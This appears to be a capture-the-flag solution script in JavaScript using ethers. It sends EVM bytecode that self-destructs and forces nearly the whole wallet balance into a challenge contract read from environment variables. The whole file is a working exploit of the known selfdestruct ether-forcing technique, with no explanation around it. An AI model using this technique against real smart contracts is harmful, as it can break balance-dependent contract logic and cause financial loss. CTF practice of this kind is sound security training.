require('dotenv').config()
const { ethers } = require("ethers");


async function main() {
    const ctfProvider = new ethers.providers.JsonRpcProvider(process.env.ETH_RPC_CTF)
    const ctfWallet = new ethers.Wallet(process.env.CTF_PK, ctfProvider)
    const target = process.env.CTF_CONTRACT

    const injectInput = `0x6080601f606438819003918201601f19168301916001600160401b03831184841017604d57808492602094604052833981010312604857516001600160a01b0381168103604857ff5b600080fd5b634e487b7160e01b600052604160045260246000fdfe000000000000000000000000${target.slice(2)}`
    const dust = ethers.utils.parseEther('0.1')
    const value = (await ctfProvider.getBalance(ctfWallet.address)).sub(dust)
    const tx = await ctfWallet.sendTransaction({
        to: ethers.constants.AddressZero,
        data: injectInput,
        gasLimit: 500000,
        value,
    })
    console.log(tx)
}

main()